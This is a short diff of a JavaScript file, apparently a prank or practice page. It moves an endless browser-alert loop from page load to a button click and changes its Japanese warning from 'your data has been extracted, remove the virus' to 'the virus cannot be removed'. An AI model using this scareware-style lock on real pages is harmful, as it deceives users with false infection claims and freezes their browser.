@@ -1,12 +1,11 @@
-window.onload = function () {
-	window.setTimeout(myalert(), 1000);
-	// while (true) {
-	// 	window.alert("データが抜き取られました。ウイルスを削除してください。");
-	// }
-}
+document.addEventListener("DOMContentLoaded", function () {
+	var btn = document.getElementById('btn');
+	btn.addEventListener("click", myalert);	
+}, false);
 
 function myalert() {
 	while (true) {
-		window.alert("データが抜き取られました。ウイルスを削除してください。");
+		window.alert("ウイルスが削除できません");
 	}
 }
+
